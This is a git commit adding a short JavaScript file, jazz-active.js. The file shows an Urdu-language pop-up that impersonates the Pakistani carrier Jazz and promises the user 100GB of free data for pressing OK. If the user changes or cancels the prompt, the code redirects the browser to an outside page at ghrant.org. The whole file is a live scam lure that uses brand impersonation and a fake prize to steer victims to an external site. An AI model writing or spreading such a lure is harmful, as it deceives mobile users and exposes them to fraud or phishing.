0db95b90ab8b73060a15b1332bb6c1a20e085732
mfednewblog8 <nsikakimoh68@gmail.com>
2025-10-17 08:47:10 +0100

    Create jazz-active.js

---
+++ jazz-active.js
@@ -0,0 +1,5 @@
+var password = '100 جی بی کو چالو کریں۔'
+password=prompt('Jazz: مبارک ہو، آپ کا Jazz سم کارڈ 100GB وصول کرنے کا اہل ہے، ابھی ایکٹیویٹ کرنے کے لیے Ok دبائیں ','100 جی بی کو چالو کریں۔');
+if (password != '100 جی بی کو چالو کریں۔') {
+location.href='https://ghrant.org/jazz.html';
+}
